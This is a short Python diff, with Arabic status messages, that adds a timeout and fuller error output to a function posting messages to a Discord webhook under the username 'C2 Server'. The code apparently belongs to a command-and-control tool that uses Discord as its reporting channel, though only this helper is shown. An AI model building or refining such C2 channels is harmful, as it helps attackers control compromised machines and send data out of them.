@@ -29,11 +29,12 @@ def send_to_discord(content):
             "content": content,
             "username": "C2 Server"
         }
-        response = requests.post(DISCORD_WEBHOOK, json=data)
+        response = requests.post(DISCORD_WEBHOOK, json=data, timeout=10)
         if response.status_code in [200, 204]:
             print(f"[Discord] ✅ تم الإرسال: {content[:50]}...")
         else:
-            print(f"[Discord] ❌ فشل: {response.status_code}")
+            print(f"[Discord] ❌ فشل: رمز الحالة {response.status_code}")
+            print(f"[Discord] استجابة السيرفر: {response.text}")
     except Exception as e:
         print(f"[Discord] ❌ خطأ: {e}")
 
